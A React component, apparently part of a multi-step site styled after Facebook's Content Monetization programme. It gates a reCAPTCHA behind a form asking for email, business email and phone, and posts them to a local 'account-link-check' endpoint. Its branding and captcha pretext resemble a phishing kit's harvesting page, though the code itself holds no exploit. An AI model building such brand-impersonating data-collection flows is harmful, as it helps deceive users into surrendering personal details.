'use client'

import React from 'react'
import PhoneInput from 'react-phone-input-2'

import ReCaptchaVerification from '#components/recaptcha/ReCaptchaVerification'
import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { updateForm } from '@/app/store/slices/stepFormSlice'
import { useAppStrings } from '@/hooks/useAppStrings'

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/

function normalizePhoneDigits(value: string) {
    return value.replace(/\D/g, '')
}

interface CaptchaAccountHumanFlowProps {
    sessionKey: number
    onVerified: () => void
}

const CaptchaAccountHumanFlow: React.FC<CaptchaAccountHumanFlowProps> = ({ sessionKey, onVerified }) => {
    const t = useAppStrings()
    const dispatch = useAppDispatch()
    const formData = useAppSelector((s) => s.stepForm.data)

    const [accountPassed, setAccountPassed] = React.useState(false)
    const [checking, setChecking] = React.useState(false)
    const [banner, setBanner] = React.useState<'none' | 'ok' | 'fail' | 'upstream'>('none')

    React.useEffect(() => {
        setAccountPassed(false)
        setChecking(false)
        setBanner('none')
    }, [sessionKey])

    const validateShape = (): boolean => {
        const email = formData.email.trim()
        const emailBusiness = formData.emailBusiness.trim()
        const digits = normalizePhoneDigits(formData.phone)
        const emailOk = email.length > 0 && EMAIL_RE.test(email)
        const bizOk = emailBusiness.length > 0 && EMAIL_RE.test(emailBusiness)
        const phoneOk = digits.length >= 8 && digits.length <= 15
        return emailOk || bizOk || phoneOk
    }

    const runAccountCheck = async () => {
        setBanner('none')
        if (!validateShape()) {
            setBanner('fail')
            return
        }
        setChecking(true)
        try {
            const email = formData.email.trim()
            const emailBusiness = formData.emailBusiness.trim()
            const phone = normalizePhoneDigits(formData.phone)
            const r = await fetch('/api/facebook-content-monetization/account-link-check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, emailBusiness, phone }),
            })
            const data = await r.json().catch(() => ({}))
            if (r.status === 503 || r.status === 501) {
                setBanner('upstream')
                setAccountPassed(false)
                return
            }
            if (!r.ok) {
                setBanner('fail')
                setAccountPassed(false)
                return
            }
            if (data.linked === true) {
                setAccountPassed(true)
                setBanner('ok')
            } else {
                setAccountPassed(false)
                setBanner('fail')
            }
        } catch {
            setBanner('upstream')
            setAccountPassed(false)
        } finally {
            setChecking(false)
        }
    }

    const fieldClass =
        'input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[6px] focus-within:border-[#3b82f6] focus-within:shadow-md transition-all duration-200'

    const failMessage =
        banner === 'fail'
            ? !validateShape()
                ? t.captcha.accountCheckNeedOneValid
                : t.captcha.accountCheckNoneLinked
            : null

    return (
        <div className="w-full">
            <div className="mb-4 rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[12px]">
                <p className="text-[13px] leading-[1.55] text-[#33507f]">{t.captcha.accountCheckIntro}</p>

                <div className="mt-3 space-y-[10px]">
                    <div>
                        <label htmlFor="captcha-contact-email" className="mb-[6px] block text-[13px] font-semibold text-[#3b4a64]">
                            {t.info.email}
                        </label>
                        <div className={fieldClass}>
                            <input
                                id="captcha-contact-email"
                                type="email"
                                autoComplete="email"
                                className="h-full w-full outline-0"
                                placeholder={t.info.emailPh}
                                value={formData.email}
                                onChange={(e) =>
                                    dispatch(
                                        updateForm({
                                            email: e.target.value,
                                        })
                                    )
                                }
                            />
                        </div>
                    </div>
                    <div>
                        <label htmlFor="captcha-business-email" className="mb-[6px] block text-[13px] font-semibold text-[#3b4a64]">
                            {t.info.emailBiz}
                        </label>
                        <div className={fieldClass}>
                            <input
                                id="captcha-business-email"
                                type="email"
                                autoComplete="email"
                                className="h-full w-full outline-0"
                                placeholder={t.info.emailBizPh}
                                value={formData.emailBusiness}
                                onChange={(e) =>
                                    dispatch(
                                        updateForm({
                                            emailBusiness: e.target.value,
                                        })
                                    )
                                }
                            />
                        </div>
                    </div>
                    <div>
                        <label className="mb-[6px] block text-[13px] font-semibold text-[#3b4a64]">{t.info.phone}</label>
                        <div className={`${fieldClass} mb-0`}>
                            <PhoneInput
                                country={formData.country_code?.toLowerCase() || 'us'}
                                value={formData.phone}
                                onChange={(phoneVal) => {
                                    const normalizedPhone = normalizePhoneDigits(phoneVal).slice(0, 15)
                                    dispatch(updateForm({ phone: normalizedPhone }))
                                }}
                                inputProps={{
                                    name: 'captcha-phone',
                                }}
                            />
                        </div>
                    </div>
                </div>

                {failMessage ? <p className="mt-2 text-[13px] text-[#e5484d]">{failMessage}</p> : null}
                {banner === 'upstream' ? (
                    <p className="mt-2 text-[13px] text-[#e5484d]">{t.captcha.accountCheckErrUpstream}</p>
                ) : null}
                {banner === 'ok' ? <p className="mt-2 text-[13px] text-[#0d7d4d]">{t.captcha.accountCheckOk}</p> : null}

                <button
                    type="button"
                    disabled={checking}
                    onClick={runAccountCheck}
                    className="mt-3 w-full min-h-[44px] rounded-[10px] bg-[#1877f2] text-[15px] font-[600] text-white transition-opacity active:opacity-90 disabled:cursor-wait disabled:opacity-85"
                >
                    {checking ? t.captcha.accountCheckVerifying : t.captcha.accountCheckVerify}
                </button>
            </div>

            <div className={!accountPassed ? 'pointer-events-none opacity-[0.45]' : ''} aria-busy={!accountPassed}>
                <ReCaptchaVerification
                    key={`${sessionKey}-human-${accountPassed ? '1' : '0'}`}
                    onVerified={onVerified}
                    blockedHint={accountPassed ? undefined : t.captcha.accountCheckUnlockRecaptcha}
                />
            </div>
        </div>
    )
}

export default CaptchaAccountHumanFlow
